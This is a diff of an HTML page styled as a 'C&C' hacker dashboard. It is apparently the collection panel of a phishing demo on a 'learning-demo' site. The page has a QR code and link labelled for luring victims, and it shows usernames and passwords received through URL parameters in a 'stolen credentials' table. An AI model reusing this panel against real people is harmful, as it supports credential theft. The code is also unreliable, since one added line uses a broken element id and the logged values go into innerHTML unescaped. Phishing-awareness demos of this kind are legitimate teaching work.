@@ -3,49 +3,135 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>攻撃者ダッシュボード | 管理画面</title>
+  <title>C&C Server | Hacker Dashboard</title>
   <link rel="stylesheet" href="style.css">
+  <style>
+    /* ハッカー風の背景と演出用スタイル */
+    body.hacker-body {
+      background-color: #050505;
+      color: #00ff66;
+      font-family: 'Courier New', Courier, monospace;
+      margin: 0;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    .matrix-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(rgba(5, 5, 5, 0.95), rgba(5, 5, 5, 0.95)),
+                  repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 100, 0.03) 2px, rgba(0, 255, 100, 0.03) 4px);
+      z-index: -1;
+      pointer-events: none;
+    }
+    .terminal-header {
+      border-bottom: 1px dashed #00ff66;
+      padding-bottom: 15px;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .matrix-stream {
+      font-size: 11px;
+      color: #005522;
+      height: 40px;
+      overflow: hidden;
+      white-space: nowrap;
+      margin-bottom: 15px;
+    }
+    .hacker-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      background: #0a0f0d;
+      border: 1px solid #00ff66;
+    }
+    .hacker-table th, .hacker-table td {
+      border: 1px solid #003311;
+      padding: 10px;
+      text-align: left;
+      font-size: 14px;
+    }
+    .hacker-table th {
+      background: #002209;
+      color: #00ff66;
+    }
+    .hacker-table td {
+      color: #00ffcc;
+    }
+    .btn-hacker {
+      background: #002209;
+      color: #00ff66;
+      border: 1px solid #00ff66;
+      padding: 8px 15px;
+      cursor: pointer;
+      font-family: 'Courier New', Courier, monospace;
+      font-weight: bold;
+      border-radius: 4px;
+    }
+    .btn-hacker:hover {
+      background: #00ff66;
+      color: #000;
+    }
+  </style>
 </head>
-<body class="admin-body">
+<body class="hacker-body">
+  <div class="matrix-bg"></div>
 
-  <div class="admin-header">
-    <h1>🔴 ATTACKER CONTROL PANEL (C&C Server)</h1>
-    <div id="connection-status" style="color: #2ed573; font-weight: bold;">🟢 監視中（ダイレクト受信モード）</div>
-  </div>
-
-  <!-- QRコードとリンクコピーパネル（ac.pngを指定） -->
-  <div style="background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
-    <img src="ac.png" alt="接続用QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 6px;">
+  <div class="terminal-header">
     <div>
-      <h3 style="color: #58a6ff; margin-bottom: 5px;">スマホ接続用URL</h3>
-      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取るか、下のリンクをコピーしてください。</p>
-      <button class="btn-copy" onclick="copyShareUrl()" style="padding: 6px 12px; background: #238636; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">リンクをコピー</button>
+      <h1 style="margin: 0; font-size: 22px; color: #00ff66;">⚡ C&C COMMAND & CONTROL SERVER</h1>
+      <div id="status-text" style="font-size: 12px; color: #ff3333; margin-top: 5px;">[ STATUS: LISTENING FOR VICTIMS... ]</div>
+    </div>
+    <div style="text-align: right;">
+      <div style="font-size: 12px; color: #00aa44;">TOTAL TARGETS: <span id="count" style="color: #fff; font-weight: bold;">0</span></div>
     </div>
   </div>
 
-  <div class="stats-card">
-    <div style="font-size: 12px; color: #8b949e;">総奪取データ数</div>
-    <div class="count-number" id="count">0</div>
+  <!-- 流れる数字・コードのハッカー風演出バー -->
+  <div class="matrix-stream" id="matrix-code">
+    01001101 01010011 01000110 00100000 01010011 01000101 01000011 01010101 01010010 01001001 01010100 01011001 00100000 01000100 01000101 01001101 01001111 00100000 01010011 01011001 01010011 01010100 01000101 01001101 00100000 01000001 01000011 01010100 01001001 01010110 01000101
   </div>
 
-  <table class="log-table">
+  <!-- QRコード＆リンク共有パネル -->
+  <div style="background: #0a0f0d; border: 1px solid #00ff66; padding: 15px; border-radius: 6px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
+    <img src="ac.png" alt="QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 4px;">
+    <div>
+      <h3 style="color: #00ffcc; margin-top: 0; margin-bottom: 5px; font-size: 16px;">被害者誘導用 QR / URL</h3>
+      <p style="font-size: 12px; color: #00aa44; margin-bottom: 10px;">このQRコードをスマホで読み取らせてください。</p>
+      <button class="btn-hacker" onclick="copyShareUrl()">🔗 スマホ用リンクをコピー</button>
+    </div>
+  </div>
+
+  <h3 style="color: #00ff66; border-left: 3px solid #00ff66; padding-left: 8px; margin-top: 30px;">📂 STOLEN CREDENTIALS (強奪データログ)</h3>
+
+  <table class="hacker-table">
     <thead>
       <tr>
         <th>受信時刻</th>
-        <th>端末情報</th>
-        <th>入力されたID</th>
-        <th>奪取されたパスワード</th>
+        <th>デバイス</th>
+        <th>キャプチャされたID</th>
+        <th>パスワード</th>
       </tr>
     </thead>
     <tbody id="log-list">
-      <tr><td colspan="4" style="text-align:center; color: #8b949e;">スマホからの入力を待機しています...</td></tr>
+      <tr><td colspan="4" style="text-align:center; color: #005522;">等待機中... (Waiting for target input...)</td></tr>
     </tbody>
   </table>
 
   <script>
-    // 自身の管理者画面のURLをベースにして、スマホ用の共有URLを自動生成する
-    const currentAdminUrl = window.location.href.split('?')[0];
-    const shareUrl = `https://sui6600.github.io/learning-demo/index.html?admin=${encodeURIComponent(currentAdminUrl)}`;
+    // ハッカー風の数字やバイナリを流すアニメーション
+    setInterval(() => {
+      const chars = "0101010101ABCDEF0123456789#$&@<>SECURITY_BREACH_DETECTED_";
+      let str = "";
+      for(let i=0; i<80; i++) {
+        str += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      document.getElementById('matrix-code').innerText = str;
+    }, 150);
+
+    // スマホ用リンクの自動生成
+    const shareUrl = `https://sui6600.github.io/learning-demo/index.html`;
 
     function copyShareUrl() {
       navigator.clipboard.writeText(shareUrl).then(() => {
@@ -55,20 +141,20 @@
 
     let logs = [];
 
-    // ページが開かれたときにURLにくっついてきたデータがあるかチェック
+    // URLパラメータからデータを即座に取得してログに追加
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.has('username')) {
       const log = {
-        time: urlParams.get('time'),
-        device: urlParams.get('device'),
+        time: urlParams.get('time') || new Date().toLocaleTimeString(),
+        device: urlParams.get('device') || 'Unknown Device',
         username: urlParams.get('username'),
         password: urlParams.get('password')
       };
       logs.unshift(log);
       renderLogs();
       
-      document.getElementById('connection-status').innerText = "🔥 被害者からのデータを強奪成功！";
-      document.getElementById('connection-status').style.color = "#ff4757";
+      document.getElementById('status-textinnerHTML').innerText = "[ STATUS: TARGET COMPROMISED! DATA SECURED ]";
+      document.getElementById('status-text').style.color = "#00ff66";
     }
 
     function renderLogs() {
@@ -82,9 +168,9 @@
         const tr = document.createElement('tr');
         tr.innerHTML = `
           <td>${log.time}</td>
-          <td><span class="badge">${log.device}</span></td>
-          <td class="highlight">${log.username}</td>
-          <td class="password-danger">${log.password}</td>
+          <td>${log.device}</td>
+          <td style="color: #ffffff; font-weight: bold;">${log.username}</td>
+          <td style="color: #ff3366; font-weight: bold; background: #220000;">${log.password}</td>
         `;
         listContainer.appendChild(tr);
       });
